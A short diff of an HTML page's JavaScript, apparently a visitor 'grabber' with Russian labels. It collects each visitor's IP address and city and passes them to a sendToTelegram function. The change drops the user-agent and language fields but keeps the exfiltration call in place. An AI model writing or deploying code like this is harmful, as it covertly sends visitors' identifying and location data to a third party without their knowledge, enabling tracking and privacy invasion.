@@ -92,8 +92,6 @@ console.log(getDeviceInfo());
         .then(data => {
           info += "IP: " + data.ip + "\n";
           info += "Город: " + data.city + "\n";
-          info += "Браузер: " + navigator.userAgent + "\n";
-          info += "Язык: " + navigator.language + "\n";
           sendToTelegram(info);
         })
         .catch(err => console.error("Ошибка:", err));
@@ -193,6 +191,7 @@ console.log(getDeviceInfo());
 </body>
 
 </html>
+
 
 
 
